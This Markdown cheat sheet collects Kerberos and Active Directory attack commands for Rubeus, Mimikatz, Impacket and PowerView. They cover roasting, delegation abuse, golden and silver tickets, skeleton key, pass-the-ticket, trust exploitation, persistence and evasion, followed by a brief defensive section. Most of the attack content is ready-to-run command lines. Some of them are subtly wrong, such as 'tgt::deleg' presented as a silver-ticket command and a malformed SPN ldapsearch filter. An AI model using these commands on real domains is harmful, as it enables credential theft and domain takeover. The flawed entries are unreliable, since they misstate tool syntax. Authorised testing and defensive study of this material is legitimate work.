# Index
- [[Microsoft Active Directory (AD)]]
	- [[Active Directory Cheat Sheet]]
	- [[Kerberos Cheat Sheet]]
	- [[LDAP Cheat Sheet]]
	- [[MSSQL Cheat Sheet]]
	- [[PowerShell Active Directory Cheat Sheet]]

Kerberos Penetration Testing Cheat Sheet

# Penetration Testing Techniques

## External Reconnaissance

#### Enumerate Domain Controllers
- **nmap**:
  ```bash
  nmap -p 88 --script "krb5-enum-users" -v -oA krb5-enum <target_ip>
  ```
- **GetUserSPNs.py (Impacket)**:
  ```bash
  GetUserSPNs.py <domain>/<username>:<password>@<target_ip> -dc-ip <target_ip> -request
  ```

## Initial Access

#### Kerberos Pre-Authentication Attacks (AS-REP Roasting)
- **Rubeus (AS-REP Roasting)**:
  ```powershell
  Rubeus.exe asreproast /user:<username>
  ```
  Crack the obtained hash:
  ```bash
  hashcat -m 18200 <asrep_hash> /path/to/wordlist.txt
  ```

## Privilege Escalation

#### Kerberoasting
- **Invoke-Kerberoast (PowerView)**:
  ```powershell
  Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerberoast.txt
  ```
- **Rubeus (Kerberoasting)**:
  ```powershell
  Rubeus.exe kerberoast
  ```
- **GetUserSPNs.py (Impacket)**:
  ```bash
  GetUserSPNs.py <domain>/<username>:<password>@<target_ip> -dc-ip <target_ip> -request
  ```
  Crack the extracted service ticket hash:
  ```bash
  hashcat -m 13100 <hash> /path/to/wordlist.txt
  ```

#### Abusing Kerberos Delegation
- **Constrained Delegation (PowerView)**:
  ```powershell
  Get-DomainUser -TrustedToAuth
  Set-DomainObject -Identity "<computer_account>" -Set @{msDS-AllowedToDelegateTo="HOST/<target_service>"}
  ```
- **S4U2Self Attack (Rubeus)**:
  ```powershell
  Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:<target_user> /msdsspn:<target_service>
  ```

#### Golden Ticket Attack
- **Mimikatz**:
  ```powershell
  kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id>
  ```

#### Silver Ticket Attack
- **Mimikatz**:
  ```powershell
  tgt::deleg /domain:<domain> /sid:<SID> /target:<target_server> /rc4:<NTLM_hash> /user:<username> /service:krbtgt
  ```

#### Skeleton Key Attack
- **Mimikatz**:
  ```powershell
  privilege::debug
  misc::skeleton
  ```

## Credential Harvesting

#### Extracting Kerberos Tickets
- **Rubeus**:
  ```powershell
  Rubeus.exe dump
  ```

#### Pass-the-Ticket (PtT) Attack
- **Mimikatz**:
  ```powershell
  kerberos::ptt <ticket.kirbi>
  ```

## Lateral Movement

#### Overpass-the-Hash (Pass-the-Key)
- **Mimikatz**:
  ```powershell
  sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /rc4:<NTLM_hash> /run:cmd.exe
  ```

## Defense Evasion

#### Clearing Kerberos Tickets
- **Rubeus**:
  ```powershell
  Rubeus.exe purge
  ```

## Domain Trust Exploitation

#### Enumerate Domain Trusts
- **PowerView**:
  ```powershell
  Get-NetDomainTrust
  ```

#### Exploiting Inter-Trust Relationships
- **Mimikatz (SID History Attack)**:
  ```powershell
  kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID>-500 /sids:<target_domain_SID>-519 /krbtgt:<NTLM_hash> /target:<target_domain> /rc4:<NTLM_hash>
  ```

## Persistence

#### Persistence via Kerberos Tickets
- **Golden Ticket Persistence**:
  ```powershell
  kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id>
  ```

#### Silver Ticket Persistence
- **Mimikatz**:
  ```powershell
  tgt::deleg /domain:<domain> /sid:<SID> /target:<target_server> /rc4:<NTLM_hash> /user:<username> /service:krbtgt
  ```

## Advanced Kerberos Attack Techniques

#### Overpass-the-Ticket Attack (Pass-the-Key)
- **Mimikatz**:
  ```powershell
  sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /rc4:<NTLM_hash> /aes256:<AES256_Key> /run:cmd.exe
  ```
  This command is used to perform an Overpass-the-Ticket attack where you can provide the AES key instead of the NTLM hash.

#### Abuse of S4U2Self and S4U2Proxy (Service-for-User-to-Self and Proxy)
- **Rubeus S4U**:
  ```powershell
  Rubeus.exe s4u /user:<service_account> /rc4:<NTLM_hash> /impersonateuser:<target_user> /msdsspn:<target_service>
  ```
  This allows an attacker to request a service ticket to a specified service (S4U2Self), and then request a ticket on behalf of the user (S4U2Proxy).

#### Exploiting Kerberos Unconstrained Delegation
- **Rubeus TGT Delegation**:
  ```powershell
  Rubeus.exe tgtdeleg /target:<target_computer>
  ```
  This command can be used to exploit systems configured with unconstrained delegation, allowing an attacker to impersonate any user by requesting their TGT.

#### Kerberos Ticket Renewal (Ticket Refresh)
- **Rubeus Renew Tickets**:
  ```powershell
  Rubeus.exe renew /target:<target_service> /user:<username> /rc4:<NTLM_hash>
  ```
  Renewing a Kerberos ticket allows an attacker to extend the ticket’s lifetime.

## Internal Reconnaissance with Kerberos

#### Enumerate Kerberos Tickets for Specific Services
- **PowerView**:
  ```powershell
  Get-DomainSPNTicket -UserName <service_account>
  ```
  Enumerates and retrieves tickets associated with specific service accounts.

#### Identify Accounts with High Privileges
- **Rubeus Triage**:
  ```powershell
  Rubeus.exe triage /show
  ```
  This command lists high-value tickets (e.g., those associated with admin accounts).

#### Enumerate Delegation Rights
- **PowerView**:
  ```powershell
  Get-DomainUser -TrustedToAuth
  Get-DomainComputer -TrustedToAuth
  ```
  Identifies users and computers with TrustedToAuthenticateForDelegation privileges.

#### Extract All Service Principal Names (SPNs)
- **ldapsearch**:
  ```bash
  ldapsearch -x -H ldap://<target_ip> -b "dc=domain,dc=com" "(objectClass=servicePrincipalName)" servicePrincipalName
  ```
  This command enumerates all SPNs in the domain, which can be targeted for Kerberoasting.

#### Identify Kerberos Pre-Authentication Disabled Accounts
- **GetNPUsers.py (Impacket)**:
  ```bash
  GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -dc-ip <target_ip>
  ```
  Identifies user accounts with Kerberos Pre-Authentication disabled (useful for AS-REP roasting).

## Advanced Persistence Techniques

#### Persistent Access via Golden Tickets
- **Mimikatz (Golden Ticket)**:
  ```powershell
  kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id> /renewmax:<renew_duration>
  ```
  A Golden Ticket attack with a specified renewal period to maintain long-term access.

#### Persistent Access via Silver Tickets
- **Mimikatz (Silver Ticket)**:
  ```powershell
  tgt::deleg /domain:<domain> /sid:<SID> /target:<target_server> /rc4:<NTLM_hash> /user:<username> /service:<service_name>
  ```
  A Silver Ticket attack allowing long-term persistence on a specific service.

#### Persistence via Kerberos Ticket Renewal
- **Rubeus Renew**:
  ```powershell
  Rubeus.exe renew /target:<target_service> /user:<username> /rc4:<NTLM_hash> /renewmax:<renew_duration>
  ```
  Maintains persistence by periodically renewing Kerberos tickets.

## Defense Strategies Against Kerberos Attacks

#### Detecting Kerberoasting
- **SIEM Monitoring**:
  Implement rules to detect abnormal activity related to Kerberos service ticket requests, particularly for accounts that typically do not request service tickets.

#### Detecting Golden Ticket Creation
- **Event Log Monitoring**:
  Monitor for Event ID 4768 and 4771 with suspicious `krbtgt` account activity, which could indicate Golden Ticket creation.

#### Mitigating Unconstrained Delegation
- **Restricting Delegation Rights**:
  Remove unconstrained delegation rights from accounts and machines, and prefer constrained delegation where necessary.

#### Enforcing Stronger Encryption
- **Configure Group Policies**:
  Enforce AES encryption for Kerberos across the domain, reducing the risk of attacks relying on weaker RC4 encryption.

#### Monitoring and Responding to Kerberos Abuse
- **SIEM and UBA**:
  Implement User Behavior Analytics (UBA) to detect anomalies in Kerberos ticket requests and authentications, helping to identify potential attacks.

#### Kerberos Armoring
- **Enable FAST (Flexible Authentication Secure Tunneling)**:
  Use FAST to provide additional protection against Kerberos-related attacks by securing the pre-authentication process.

#### Auditing Account Configurations
- **Regular Account Audits**:
  Perform regular audits to identify accounts with SPNs, accounts with Pre-Auth disabled, and those with delegation rights.

## Attack Simulation with Kerberos

#### Simulating a Kerberoasting Attack
- **Invoke-Kerberoast**:
  ```powershell
  Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerberoast.txt
  ```
  Simulate Kerberoasting to assess detection capabilities.

#### Simulating Golden Ticket Attack
- **Create Golden Ticket with Mimikatz**:
  ```powershell
  kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id>
  ```
  Simulate a Golden Ticket attack and monitor the SIEM for alerts.